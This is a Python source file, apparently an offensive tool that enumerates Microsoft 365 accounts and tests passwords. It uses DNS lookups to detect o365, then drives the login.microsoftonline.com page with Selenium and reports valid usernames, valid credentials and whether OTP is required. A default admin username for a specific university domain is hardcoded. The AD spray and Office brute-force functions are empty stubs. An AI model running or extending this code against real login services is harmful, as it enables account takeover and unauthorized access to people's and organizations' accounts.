#!/usr/bin/env python3
import platform
import os
import socket
import time
from datetime import datetime
from argparse import ArgumentParser
from threading import Thread
import requests
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

default_creds = {
    "username": 'admin@futa.edu.ng',
    "password": 'password1'
}


def switch():
    parser = ArgumentParser()
    parser.add_argument(
        '-d', '--host', help='hostname, domain or url to bruteforce', required=False)
    parser.add_argument(
        '-m', '--mode', help='bruteforce mode to use [single|o365|smb]', required=False,)
    parser.add_argument('-u', '--username',
                        help='username to test', required=False)
    parser.add_argument('-p', '--password',
                        help='password to test', required=False)
    parser.add_argument('-uf', '--userfile',
                        help='list of usernames to test', required=False)
    parser.add_argument('-pf', '--passfile',
                        help='list of password to test', required=False)
    parser.add_argument('-policy', '--policy',
                        help='password policy to be applied [attempts,seconds]', required=False)
    # parser.add_argument('-r','--request', help='parse a request file {input file must be in txt}',required=False)
    # parser.add_argument('-t','--thread', help='Number of threads to use [only use with -c or --check]',required=False)
    parser.add_argument('-v', '--verbose', help='read output to terminal',
                        required=False, action='store_true')
    return parser.parse_args()


def cls():
    os_env = platform.platform()
    if 'Windows' in os_env:
        os.system('cls')
    else:
        os.system('clear')


def brute_office(domain):
    # TODO: bruteforce office 365 here
    pass


def sprayAD(host):
    # TODO: run AD spray here
    pass


def using_o365(username):
    global iso365

    domain = username.split("@")[1].replace('.', '-')
    url_dict = {
        "Global Office365": ".mail.protection.outlook.com",
        "other convention for Office365": ".mail.protection." + domain
    }
    for line in url_dict:
        try:
            host = socket.gethostbyname(domain + url_dict[line])
            iso365 = True
            if(args.verbose):
                print("{0} uses {1} and resolves to {2}".format(
                    args.username.split('@')[1], line, host))
                print("Result: {0}{1}".format(domain, url_dict[line]))
        except:
            pass


class check_o365(Thread):
    def __init__(self, username, password=default_creds["password"]):
        Thread.__init__(self)
        self.username = username
        self.password = password

    def run(self):
        using_o365(self.username)
        if not iso365:
            print("[!]. Target is not using o365. Aborting.")
        else:
            driver = webdriver.Chrome()
            driver.get("https://login.microsoftonline.com") 
            element = driver.find_element_by_name("loginfmt")
            element.send_keys(self.username)
            element.send_keys(Keys.RETURN)
            time.sleep(1)
            try:
                driver.find_element_by_id("usernameError")
                print("[!] {0} is not a valid username".format(self.username))
            except:
                element = driver.find_element_by_name("passwd")
                element.send_keys(self.password)
                time.sleep(1)
                element.send_keys(Keys.RETURN)
                try:
                    driver.find_element_by_id("passwordError")
                    print("[!] Valid username: {0} with incorrect password".format(
                        self.username))
                except:
                    try:
                        driver.find_element_by_id("idDiv_SAOTCS_Proofs")
                        print(
                            "[*] Valid crentials found but requires OTP. {0}:{1}".format(self.username, self.password))
                    except:
                        print("[**] Valid credentials found with no OTP required. {0}:{1}".format(
                            self.username, self.password))
    
def main():
    cls()
    print("Starting enumeration script. Hold tight: {0}".format(
        datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    userCheck = check_o365(args.username)
    userCheck.start()


if __name__ == '__main__':
    args = switch()
    main()
